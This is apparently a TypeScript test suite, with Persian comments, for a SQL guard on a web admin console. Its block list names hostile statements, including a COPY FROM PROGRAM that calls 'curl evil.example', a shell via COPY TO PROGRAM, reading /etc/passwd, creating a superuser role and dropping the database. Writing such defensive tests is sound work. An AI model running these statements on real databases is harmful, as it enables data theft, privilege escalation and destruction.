import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { inspectSql, stripLiterals } from "@/lib/admin/sql-guard";

/**
 * این تست‌ها قرارداد امنیتیِ کنسول SQL‌اند.
 *
 * کنسول عمداً قدرتِ کامل می‌دهد؛ چیزی که اینجا بررسی می‌شود آن مشتِ کوچکِ
 * دستورهایی است که *هیچ* کارِ مشروعی در یک صفحهٔ وب ندارند.
 */

describe("جدا کردن رشته‌ها و کامنت‌ها", () => {
  test("محتوای رشته دیگر شبیه دستور نیست", () => {
    const out = stripLiterals("insert into notes (body) values ('drop database sarva')");
    assert.ok(!out.includes("drop database"), out);
    assert.ok(out.includes("insert into notes"), out);
  });

  test("کامنت خطی و بلوکی حذف می‌شوند", () => {
    assert.ok(!stripLiterals("select 1; -- drop database x").includes("drop database"));
    assert.ok(!stripLiterals("select 1; /* drop database x */").includes("drop database"));
  });

  test("کامنت بلوکیِ تودرتو هم", () => {
    const out = stripLiterals("select 1 /* a /* b */ c */ ; delete from users where id = 1");
    assert.ok(!out.includes("a"), out);
    assert.ok(out.includes("delete from users"), out);
  });

  test("رشتهٔ دلاری", () => {
    assert.ok(!stripLiterals("select $$drop database x$$").includes("drop database"));
    assert.ok(!stripLiterals("select $t$drop database x$t$").includes("drop database"));
  });

  test("شناسهٔ داخل گیومه، بدون گیومه نگه داشته می‌شود", () => {
    assert.ok(stripLiterals('delete from "admin_audit_log"').includes("admin_audit_log"));
  });

  test("کوتیشنِ فرارشده رشته را زودتر نمی‌بندد", () => {
    const out = stripLiterals("select 'it''s fine; drop database x'");
    assert.ok(!out.includes("drop database"), out);
  });
});

describe("دستورهای ممنوع", () => {
  const forbidden = [
    "drop database sarva",
    "DROP DATABASE sarva",
    "drop schema public cascade",
    "create database x",
    "alter system set log_statement = 'all'",
    "copy users from program 'curl evil.example'",
    "copy (select 1) to program 'sh'",
    "select pg_read_file('/etc/passwd')",
    "select pg_ls_dir('/')",
    "select pg_terminate_backend(1)",
    "create extension dblink",
    "grant all on users to public",
    "create role attacker superuser",
    "alter user sarva with password 'x'",
  ];

  for (const sql of forbidden) {
    test(`رد می‌شود: ${sql.slice(0, 40)}`, () => {
      const out = inspectSql(sql);
      assert.ok(out.blocked, `اجازه داده شد: ${sql}`);
      assert.equal(out.blocked!.kind, "forbidden");
    });
  }

  test("با فاصله و خط تازهٔ اضافه هم گرفته می‌شود", () => {
    assert.ok(inspectSql("drop\n\n   database   sarva").blocked);
  });

  test("کوئری‌های عادی رد نمی‌شوند", () => {
    for (const sql of [
      "select * from users limit 10",
      "insert into vocab_words (grade, lesson, word, meaning) values ('دهم', 1, 'a', 'b')",
      "update questions set difficulty = 'hard' where type = 'audio'",
      "delete from vocab_words where grade = 'دهم' and lesson = 1",
      "with q as (insert into questions (type) values ('text') returning id) select * from q",
    ]) {
      assert.equal(inspectSql(sql).blocked, null, `بی‌دلیل رد شد: ${sql}`);
    }
  });
});

describe("جدول‌های فقط‌خواندنی", () => {
  test("نوشتن روی لاگ ممیزی ممکن نیست", () => {
    for (const sql of [
      "delete from admin_audit_log",
      "update admin_audit_log set summary = 'x'",
      "insert into admin_audit_log (action) values ('x')",
      "truncate admin_audit_log",
      "truncate table admin_audit_log",
      "drop table admin_audit_log",
      "drop table if exists admin_audit_log",
      "alter table admin_audit_log drop column summary",
      "delete from public.admin_audit_log",
      'delete from "admin_audit_log"',
    ]) {
      const out = inspectSql(sql);
      assert.ok(out.blocked, `اجازه داده شد: ${sql}`);
      assert.equal(out.blocked!.kind, "protected-table");
    }
  });

  test("نوشتن روی schema_migrations هم", () => {
    assert.ok(inspectSql("delete from schema_migrations").blocked);
  });

  test("ولی خواندنشان آزاد است", () => {
    assert.equal(inspectSql("select * from admin_audit_log limit 5").blocked, null);
    assert.equal(inspectSql("select count(*) from schema_migrations").blocked, null);
  });
});

describe("هشدارها", () => {
  test("delete بدون where", () => {
    const out = inspectSql("delete from vocab_words;");
    assert.equal(out.blocked, null);
    assert.ok(out.warnings.some((w) => w.includes("delete")), out.warnings.join(" | "));
  });

  test("ولی delete با where هشدار نمی‌دهد", () => {
    const out = inspectSql("delete from vocab_words where lesson = 1;");
    assert.equal(out.warnings.length, 0, out.warnings.join(" | "));
  });

  test("update بدون where", () => {
    const out = inspectSql("update users set role = 'admin'");
    assert.ok(out.warnings.some((w) => w.includes("update")));
  });

  test("دست بردن در جدول کاربران همیشه هشدار دارد", () => {
    const out = inspectSql("update users set full_name = 'x' where id = '1'");
    assert.ok(out.warnings.some((w) => w.includes("argon2")), out.warnings.join(" | "));
  });

  test("alter table یادآوری migration می‌دهد", () => {
    const out = inspectSql("alter table vocab_words add column note text");
    assert.ok(out.warnings.some((w) => w.includes("migration")));
  });

  test("یک select ساده هیچ هشداری ندارد", () => {
    assert.deepEqual(inspectSql("select 1").warnings, []);
  });
});
